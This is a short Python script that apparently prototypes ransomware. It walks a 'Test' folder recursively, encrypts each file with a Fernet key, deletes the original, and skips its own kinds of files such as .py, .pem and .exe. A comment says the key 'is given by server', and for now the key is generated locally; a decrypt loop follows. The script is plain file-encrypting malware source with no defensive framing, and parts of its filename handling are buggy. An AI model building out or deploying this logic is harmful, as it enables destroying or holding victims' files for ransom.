import os
from pathlib import Path
from cryptography.fernet import Fernet

def recursiveScan(baseDir):
    # scan current directory
    for entry in os.scandir(baseDir):
        if entry.is_file():
            # is file
            yield entry
        else:
            # if folder, start a new scan of contents
            yield from recursiveScan(entry.path)


def encrypt(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        original = fl.read()
    
    encrypted = f.encrypt(original)

    filename, extension = str(file).split('.')
    filename += '_encrypted.'
    encFile = Path(filename + extension)
    with open(encFile, 'wb+') as fl:
        fl.write(encrypted)
    os.remove(file)


def decrypt(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        encrypted = fl.read()
    
    decrypted = f.decrypt(encrypted)

    filename, extension = str(file).split('.')
    filename = filename.split('_encrypted')[0]

    filename += '_decrypted.'
    decFile = Path(filename + extension)

    with open(decFile, 'wb+') as fl:
        fl.write(decrypted)


# key is given by server
### Temporary
key = Fernet.generate_key()
### ----------


exclude = ['.py','.pem', '.exe', '.imin']
for item in recursiveScan(os.getcwd() + '\Test'): 
    filePath = Path(item)
    extension = filePath.suffix.lower()

    if extension in exclude:
        continue
    encrypt(filePath, key)
    print('Encrypted ' + str(filePath))

for item in recursiveScan(os.getcwd() + '\Test'): 
    filePath = Path(item)
    extension = filePath.suffix.lower()


    if extension in exclude:
        continue
    decrypt(filePath, key)